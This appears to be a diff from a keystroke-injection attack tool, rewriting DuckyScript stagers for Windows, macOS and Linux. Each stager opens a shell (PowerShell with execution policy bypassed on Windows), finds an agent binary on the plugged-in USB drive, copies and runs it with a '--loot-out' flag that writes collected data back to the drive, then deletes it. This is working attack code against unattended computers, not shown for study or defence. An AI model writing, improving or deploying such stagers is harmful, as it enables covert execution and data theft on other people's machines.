@@ -80,6 +80,10 @@ def _clear_staged_binaries(*, keep: str = '') -> None:
             pass
 
 
+def _ducky_string_lines(lines: tuple[str, ...]) -> str:
+    return ''.join('STRING ' + line + '\nENTER\n' for line in lines)
+
+
 class _BinaryMixin:
     _usb: USBService
 
@@ -100,47 +104,58 @@ class _BinaryMixin:
     def _usb_drive_stager_script(self, target_os: str) -> str:
         agent_name = usb_agent_filename(target_os)
         if target_os == 'windows':
-            cmd = (
-                'powershell -w hidden -c "$r=(Get-PSDrive -PSProvider FileSystem | % Root | '
-                "?{Test-Path ($_ + '"
-                + agent_name
-                + "')} | select -First 1); if($r){$s=$r + '"
-                + agent_name
-                + "'; $loot=$r + '"
-                + _USB_LOOT_FILE
-                + "'; $exe=Join-Path $env:TEMP 'pico_agent.exe'; "
-                + 'Copy-Item $s $exe -Force; & $exe --loot-out $loot; '
-                + 'Remove-Item $exe -Force -ErrorAction SilentlyContinue}"'
-            )
-            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'
-
-        if target_os == 'macos':
-            cmd = (
-                'for d in /Volumes/*; do [ -f "$d/'
-                + agent_name
-                + '" ] && cp "$d/'
-                + agent_name
-                + '" /tmp/pico_agent && chmod +x /tmp/pico_agent && '
-                + '/tmp/pico_agent --loot-out "$d/'
-                + _USB_LOOT_FILE
-                + '" ; rm -f /tmp/pico_agent; break; done'
+            lines = (
+                '$r = ""',
+                'foreach ($drive in Get-PSDrive -PSProvider FileSystem) {',
+                "$candidate = Join-Path $drive.Root '" + agent_name + "'",
+                'if (Test-Path $candidate) { $r = $drive.Root; break }',
+                '}',
+                'if ($r) {',
+                "$s = Join-Path $r '" + agent_name + "'",
+                "$loot = Join-Path $r '" + _USB_LOOT_FILE + "'",
+                "$exe = Join-Path $env:TEMP 'pico_agent.exe'",
+                'Copy-Item $s $exe -Force',
+                '& $exe --loot-out $loot',
+                'Remove-Item $exe -Force -ErrorAction SilentlyContinue',
+                '}',
             )
             return (
-                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
-                'DELAY 600\nSTRING ' + cmd + '\nENTER'
+                'DELAY 700\nGUI r\nDELAY 700\n'
+                'STRING powershell -NoProfile -ExecutionPolicy Bypass\nENTER\n'
+                'DELAY 1800\nDEFAULTCHARDELAY 8\n' + _ducky_string_lines(lines)
             )
 
-        cmd = (
-            'for d in /media/$USER/* /run/media/$USER/* /mnt/*; do [ -f "$d/'
-            + agent_name
-            + '" ] && cp "$d/'
-            + agent_name
-            + '" /tmp/pico_agent && chmod +x /tmp/pico_agent && '
-            + '/tmp/pico_agent --loot-out "$d/'
-            + _USB_LOOT_FILE
-            + '" ; rm -f /tmp/pico_agent; break; done'
+        if target_os == 'macos':
+            lines = (
+                'for d in /Volumes/*; do',
+                'if [ -f "$d/' + agent_name + '" ]; then',
+                'cp "$d/' + agent_name + '" /tmp/pico_agent',
+                'chmod +x /tmp/pico_agent',
+                '/tmp/pico_agent --loot-out "$d/' + _USB_LOOT_FILE + '"',
+                'rm -f /tmp/pico_agent',
+                'break',
+                'fi',
+                'done',
+            )
+            return (
+                'DELAY 700\nGUI SPACE\nDELAY 600\nSTRING Terminal\nENTER\n'
+                'DELAY 2200\nDEFAULTCHARDELAY 8\n' + _ducky_string_lines(lines)
+            )
+
+        lines = (
+            'for d in /media/$USER/* /run/media/$USER/* /mnt/*; do',
+            'if [ -f "$d/' + agent_name + '" ]; then',
+            'cp "$d/' + agent_name + '" /tmp/pico_agent',
+            'chmod +x /tmp/pico_agent',
+            '/tmp/pico_agent --loot-out "$d/' + _USB_LOOT_FILE + '"',
+            'rm -f /tmp/pico_agent',
+            'break',
+            'fi',
+            'done',
         )
-        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + cmd + '\nENTER'
+        return 'DELAY 700\nCTRL-ALT t\nDELAY 1800\nDEFAULTCHARDELAY 8\n' + _ducky_string_lines(
+            lines
+        )
 
     def _stager_script(self, target_os: str) -> str:
         return self._usb_drive_stager_script(target_os)
